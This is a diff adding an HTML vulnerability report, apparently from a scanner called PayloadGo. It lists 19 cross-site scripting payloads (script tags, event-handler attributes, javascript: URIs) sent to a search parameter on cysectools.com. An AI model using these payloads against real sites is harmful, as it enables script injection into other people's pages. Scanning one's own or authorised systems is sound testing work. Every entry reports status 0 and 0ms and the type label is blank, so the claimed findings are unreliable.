@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PayloadGo Vulnerability Report</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; }
+        .header { background: #007bff; color: white; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
+        .summary { background: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
+        .vuln-section { margin: 20px 0; }
+        .vuln-type { color: #dc3545; font-size: 1.2em; font-weight: bold; margin-bottom: 10px; }
+        .vulnerability { background: #fff; border: 1px solid #dee2e6; margin: 10px 0; padding: 15px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .payload { font-family: monospace; background: #e9ecef; padding: 8px; border-radius: 3px; word-break: break-all; }
+        .url { color: #007bff; word-break: break-all; }
+        .stats { display: flex; gap: 20px; margin: 10px 0; }
+        .stat { background: #e9ecef; padding: 10px; border-radius: 5px; text-align: center; }
+        .stat-number { font-size: 1.5em; font-weight: bold; color: #007bff; }
+        .stat-label { font-size: 0.9em; color: #6c757d; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>PayloadGo Vulnerability Report</h1>
+        <p>Generated on 2025-09-26 20:20:49</p>
+    </div>
+    
+    <div class="summary">
+        <h2>Executive Summary</h2>
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-number">19</div>
+                <div class="stat-label">Total Vulnerabilities</div>
+            </div>
+            <div class="stat">
+                <div class="stat-number">1</div>
+                <div class="stat-label">Vulnerability Types</div>
+            </div>
+        </div>
+    </div>
+    <div class="vuln-section">
+        <div class="vuln-type"> (19 instances)</div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E%3C%2Fiframe%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;body onload=alert(1)&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Cbody+onload%3Dalert%281%29%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;select onfocus=alert(1) autofocus&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Cselect+onfocus%3Dalert%281%29+autofocus%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&gt;&lt;img src=x onerror=alert(1)&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;input onfocus=alert(1) autofocus&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Cinput+onfocus%3Dalert%281%29+autofocus%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;img src=x onerror=alert(1)&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;svg onload=alert(1)&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Csvg+onload%3Dalert%281%29%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;textarea onfocus=alert(1) autofocus&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Ctextarea+onfocus%3Dalert%281%29+autofocus%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;script&gt;alert(1)&lt;/script&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;keygen onfocus=alert(1) autofocus&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;video&gt;&lt;source onerror=alert(1)&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Cvideo%3E%3Csource+onerror%3Dalert%281%29%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">javascript:alert(1)</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=javascript%3Aalert%281%29</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;marquee onstart=alert(1)&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Cmarquee+onstart%3Dalert%281%29%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;audio src=x onerror=alert(1)&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Caudio+src%3Dx+onerror%3Dalert%281%29%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;embed src=&#34;javascript:alert(1)&#34;&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Cembed+src%3D%22javascript%3Aalert%281%29%22%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;details open ontoggle=alert(1)&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Cdetails+open+ontoggle%3Dalert%281%29%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;table&gt;&lt;td background=&#34;javascript:alert(1)&#34;&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Ctable%3E%3Ctd+background%3D%22javascript%3Aalert%281%29%22%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;object data=&#34;javascript:alert(1)&#34;&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Cobject+data%3D%22javascript%3Aalert%281%29%22%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+        <div class="vulnerability">
+            <p><strong>Payload:</strong> <span class="payload">&lt;math&gt;&lt;mi//xlink:href=&#34;data:x,&lt;script&gt;alert(1)&lt;/script&gt;&#34;&gt;</span></p>
+            <p><strong>URL:</strong> <span class="url">http://cysectools.com/search?q=%3Cmath%3E%3Cmi%2F%2Fxlink%3Ahref%3D%22data%3Ax%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3E</span></p>
+            <p><strong>Status:</strong> 0 | <strong>Time:</strong> 0ms</p>
+        </div>
+    </div>
+</body>
+</html>
